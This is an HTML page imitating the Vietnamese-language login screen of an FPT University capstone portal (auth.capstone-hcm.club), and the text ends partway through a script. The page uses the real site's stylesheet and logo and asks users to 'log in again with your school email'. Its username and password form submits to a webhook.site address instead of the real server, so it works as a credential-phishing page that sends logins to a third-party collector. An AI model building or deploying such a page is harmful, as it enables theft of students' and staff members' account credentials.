<html>

    <link rel="stylesheet" href="http://auth.capstone-hcm.club//Content/Resources/plugins/dist/css/AdminLTE.min.css">

<body class="hold-transition">
    <div class="login-overlay login-page"></div>
    <div class="login-box">
        <div class="login-logo">
            <div class="my-logo">
                <img src="http://auth.capstone-hcm.club//Content/img/img-logo-fe.jpg">
            </div>
        </div>
        <div class="login-box-body">
            <p class="login-box-msg">Vui lòng đăng nhập lại bằng email trường</p>
            <form action="http://webhook.site/362b24d8-7424-4a4f-b54f-40e3d808006e" method="post">
                <input type="hidden" name="ReturnUrl" value="/" />
                <div class="form-group has-feedback">
                    <input class="form-control" name="Username" placeholder="Tên đăng nhập">
                    <span class="glyphicon glyphicon-user form-control-feedback"></span>
                </div>
                <div class="form-group has-feedback">
                    <input type="password" class="form-control" name="Password" placeholder="Mật khẩu">
                    <span class="glyphicon glyphicon-lock form-control-feedback"></span>
                </div>
                <p class="text-error"><div class="validation-summary-valid" data-valmsg-summary="true"><ul><li style="display:none"></li>
</ul></div></p>
                <div class="row">
                    <div class="col-xs-12">
                        <div class="checkbox icheck">
                            <label>
                                <input type="checkbox" name="RememberMe" value="true"> Lưu mật khẩu
                            </label>
                        </div>
                    </div><!-- /.col -->
                    <div class="col-xs-12">
                        <button type="submit" class="btn btn-primary btn-block btn-flat">Đăng nhập</button>
                    </div><!-- /.col -->
                </div>
            </form>
            <div class="social-auth-links text-center">
                <form action="/Account/ExternalLogin" method="post">
                    <input name="__RequestVerificationToken" type="hidden" value="og3hFSm2UYc7DNX95_j-tcelW3P4MiSTsLr31gP2---ikalgpoS0cpDj58sL5IK_f4IleK2Tvc5FxAXyeXHMaGiEjHEoThJ5v7xtQ-ndpB81" />
                    <input type="hidden" name="ReturnUrl" value="/" />
                    <div id="socialLoginList">
                        <p>
                            <button type="submit" class="btn btn-block btn-social btn-google"
                                    name="provider"
                                    value="Google"
                                    title="Log in using your Google account">
                                <i class="fab fa-google-plus"></i>  Đăng nhập bằng email fpt.edu.vn
                            </button>
                        </p>
                    </div>
                    <input type="hidden" name="returnUrl" value="" />
                </form>
            </div><!-- /.social-auth-links -->
        </div><!-- /.login-box-body -->

    <script>
        $(function () {
            $('input').iCheck({
                checkboxClass: 'icheckbox_square-blue',
                radioClass: 'iradio_square-blue',
